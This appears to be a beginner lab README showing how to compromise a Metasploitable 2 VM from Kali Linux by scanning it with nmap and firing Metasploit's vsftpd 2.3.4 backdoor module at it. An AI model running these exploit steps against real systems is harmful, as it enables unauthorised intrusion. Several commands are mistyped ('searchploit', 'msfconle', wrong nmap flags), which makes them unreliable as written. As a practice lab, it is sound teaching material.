# Introduction-to-Hacking-tools
This is the procedure to create a Metasploitable Machine and compromise the system using Metasploit.<br>
It is assumed that both the network for the Target Machine (Metasploitable 2) and the Hacking Lab (Kali Linux) are configured to NatNetwork in Virtualbox.<br>
Both should be running before performing the exploitation.<br> Metasploitable 2 has the msfconsole 6 which is what is used in the hacking process.<br>
Kali Linux version 2022.1 is used. 

STEP 1: Power up your Kali Linux and Metasploitable Virtual Machines.<br>
STEP 2: Login to Metasploitable. We need to fetch the IP Address which is needed to compromise the system. Hence, the need to login to Metasploitable.<br>
STEP 3: In the Metasploitable shell, run the ifconfig command to retrieve the ip address to use in Kali Linux<br>
STEP 4: In Kali Linux, make sure to login to root<br>
STEP 5: Run NMAP command to show the list of open ports to which to exploit using the IP Address retrieved in STEP 3 - nmap –Sc –Sv –O –o Metasploit 10.0.2.6<br>
The ftp protocol running on port 21 is open and we want to exploit it. Copy the version number vsftpd 2.3.4<br>
STEP 6: To view the exploit, type the following command - searchploit vsftpd 2.3.4<br>
STEP 7: Type msfconle to boot Metasploitable shell<br>
STEP 8: Search for the exploit ftp module vsftpd in the msfconsole by typing - search vsftpd<br>
STEP 9: Copy the name of the exploit (this shows where the directory of the exploit is stored in Kali Linux) and run the command to use the exploit - use exploit/unix/ftp/vsftpd_234_backdoor<br>
STEP 10: Type options to show the options of the exploit module in the current folder<br>
RHOSTS is the remote host (the target machine’s ip address that you what to exploit).<br>
STEP 11: Type the command - set RHOSTS 10.0.2.6<br>
STEP 12: Type the run command or exploit to compromise the system - run<br>
